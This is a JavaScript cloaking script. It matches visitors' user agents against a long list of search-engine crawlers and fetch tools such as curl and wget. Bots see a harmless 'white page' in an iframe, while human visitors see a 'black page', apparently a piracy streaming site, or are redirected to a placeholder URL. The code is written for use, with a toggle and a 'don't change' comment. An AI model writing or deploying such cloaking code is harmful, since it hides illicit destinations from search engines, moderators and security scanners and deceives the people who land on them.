// Cloaking

const white_page = "https://react-icons.github.io/react-icons/icons?name=fa"; //white page
const black_page = "https://lk21official.info/"; //black page
const cloaking_on = true; //Turn to false to turn off cloaking

// Don't change the below lines
const isBot = () => {
  const botPattern = "(googlebot\/|bot|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)";
  const re = new RegExp(botPattern, 'i');
  const userAgent = navigator.userAgent;
  return re.test(userAgent);
}
const iframe = document.getElementById('tree');

// 
var redirectUrl = 'REDIRECT_URL';
var crawlerUserAgentPattern = 'BLOCKED_USER_AGENTS';

function checkUserAgent() {

  var test = new RegExp(crawlerUserAgentPattern, 'i');
  var userAgent = navigator.userAgent;
  return !test.test(userAgent);
}

function checkBrowsers() {

  var isOpera = (!!window.opr && !!opr.addons) || !!window.opera || navigator.userAgent.indexOf(' OPR/') >= 0;
  var isFirefox = typeof InstallTrigger !== 'undefined';
  var isSafari = /constructor/i.test(window.HTMLElement) || (function (p) {
    return p.toString() === '[object SafariRemoteNotification]';
  })(!window['safari'] || (typeof safari !== 'undefined' && safari.pushNotification));
  var isIE = /*@cc_on!@*/false || !!document.documentMode;
  var isEdge = !isIE && !!window.StyleMedia;
  var isChrome = !!window.chrome && (!!window.chrome.webstore || !!window.chrome.runtime);
  var isEdgeChromium = isChrome && (navigator.userAgent.indexOf('Edg') != -1);
  var isBlink = (isChrome || isOpera) && !!window.CSS;

  var browsers = [isOpera, isFirefox, isSafari, isIE, isEdge, isChrome, isEdgeChromium, isBlink];
  var passes = false;
  browsers.forEach(function (browser) {
    if (browser) {
      passes = true;
    }
  });

  return passes;
}

const handleFeatures = () => {
  if (checkUserAgent() && checkBrowsers()) {
    window.location.replace(redirectUrl);
  }
  else {
    document.addEventListener('DOMContentLoaded', function () {
      var overlay = document.getElementById('overlay');
      overlay.style.display = 'none';
      overlay.parentNode.removeChild(overlay);
    });
  }
}

const handleBotCrawling = () => {
  if (cloaking_on) {
    if (isBot()) iframe.src = white_page;
    else iframe.src = black_page;
  } else {
    iframe.src = white_page;
  }
}

handleBotCrawling();